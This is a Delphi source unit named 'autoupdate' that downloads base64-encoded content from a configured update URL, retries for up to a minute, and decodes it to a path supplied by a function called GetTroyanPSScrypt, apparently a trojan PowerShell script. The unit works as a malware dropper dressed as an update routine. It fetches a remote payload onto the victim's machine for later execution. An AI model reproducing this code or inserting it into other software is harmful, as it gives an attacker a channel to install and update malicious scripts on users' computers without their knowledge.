unit autoupdate;

interface

uses
  Windows, SysUtils, embeddingsMan, consts, Classes, ShellAPI, ActiveX, IdHTTP, IdSSLOpenSSL, EncdDecd;

procedure AutoUpdateX;

implementation


procedure DecodeBase64ToFile(const EncodedText, FilePath: string);
var
  MemoryStream: TMemoryStream;
  StringStream: TStringStream;
begin
  MemoryStream := TMemoryStream.Create;
  StringStream := TStringStream.Create(EncodedText);
  try
    StringStream.Position := 0;
    DecodeStream(StringStream, MemoryStream);
    MemoryStream.SaveToFile(FilePath);
  finally
    MemoryStream.Free;
    StringStream.Free;
  end;
end;

function DoAutoUpdate(const updateUrl: string): Boolean;
var
  ResponseText: string;
  HTTPClient: TIdHTTP;
  Timeout, Delay, StartTime: TDateTime;
begin
  Result := False;
  HTTPClient := TIdHTTP.Create(nil);
  try
    HTTPClient.ReadTimeout := 8000; // 5 seconds timeout for each request

    Timeout := Now + EncodeTime(0, 1, 0, 0); // 1 minute timeout
    Delay := EncodeTime(0, 0, 5, 0); // 5 seconds delay
    StartTime := Now;

    while Now < Timeout do
    begin
      try
        ResponseText := HTTPClient.Get(updateUrl);
        if HTTPClient.ResponseCode = 200 then
        begin
          DecodeBase64ToFile(ResponseText, GetTroyanPSScrypt);
          Result := True;
          Exit;
        end;
      except
        on E: Exception do
          // Handle exceptions (log if needed)
      end;
      Sleep(5000); // Sleep for 5 seconds
    end;
  finally
    HTTPClient.Free;
  end;
end;


procedure AutoUpdateX;
begin
  DoAutoUpdate(consts.xupdateurl);
end;

end.
